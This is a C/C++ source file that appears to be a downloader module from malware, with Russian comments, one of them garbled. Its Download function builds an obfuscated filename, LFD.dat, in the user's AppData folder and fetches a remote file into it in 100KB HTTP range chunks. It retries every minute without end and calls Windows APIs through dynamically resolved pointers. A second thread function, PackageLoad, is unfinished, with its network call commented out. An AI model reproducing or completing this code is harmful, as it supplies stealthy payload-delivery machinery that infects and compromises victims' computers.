#include"PackageLoad.h"

#define STEP	1024*100

void Download(char*URL,WCHAR*FileName)
{
	 
	WCHAR SysPath1[MAX_PATH];
	m_memset(SysPath1,0,MAX_PATH);
	if (FileName==NULL)
	{
		WCHAR LoadedFileName[] = {'\\','L','F','D','.','d','a','t',L'\0'};
		pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);
		plstrcatW( SysPath1, LoadedFileName );
	}
	else
	{
		plstrcatW( SysPath1, FileName );
	}
	HANDLE hFile = (HANDLE)pCreateFileW( SysPath1, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
	LONGLONG nFileLen = 0;
	if (hFile!=INVALID_HANDLE_VALUE)
	{
		DWORD dwSizeHigh=0, dwSizeLow=0;
		dwSizeLow = (DWORD)pGetFileSize(hFile, &dwSizeHigh);
		nFileLen = ((LONGLONG)dwSizeHigh * (LONGLONG)(4294967295+1)) + (LONGLONG)dwSizeLow;// на случай очень большого файла
		while (true)
		{
			PHTTPRequest R = HTTPCreateRequest(URL);

			R->UseRange = true;
			R->StartRange = (DWORD)nFileLen;
			R->EndRange = (DWORD)(nFileLen+STEP);

			PCHAR Result;

			THTTPResponse Response;
			ClearStruct(Response);

			HTTP::TResponseData Resp;
			ClearStruct(Resp);
			Resp.Buffer = &Result;
			Resp.Response = &Response;
	
			DWORD Size;
			Resp.Size =&Size;
	
		
			if(false==HTTP::ExecuteMethod(R, &Resp))
			{			
				pSleep(1000*60);
				continue;
			}
			if (0==Response.FullSize)//по запросу нету данных, скорее всего все закачано
			{				
				break;
			}
			DWORD ButeWriten;
			pWriteFile(hFile, Result, Size, &ButeWriten, NULL );

			nFileLen+=ButeWriten;
			if (nFileLen==Response.FullSize)
			{
				//ѕолучили данные, и они равны размеру файла, выходим
				break;
			}
			STR::Free(Result);
			HTTPFreeRequest(R);
			HTTPResponse::Clear(&Response);
	
		
		}
		pCloseHandle(hFile);
	}	
}



DWORD WINAPI PackageLoad( LPVOID lpData )
{
	while (true)
	{
		WCHAR SysPath1[MAX_PATH];
		WCHAR LoadedFileName[] = {'\\','L','F','D','.','d','a','t',L'\0'};

		pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);
		plstrcatW( SysPath1, LoadedFileName );
		HANDLE hFile = (HANDLE)pCreateFileW( SysPath1, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
		if (hFile!=INVALID_HANDLE_VALUE)
		{
		//	HTTP::ExecuteMethod(R, &Resp);
		}
	}
}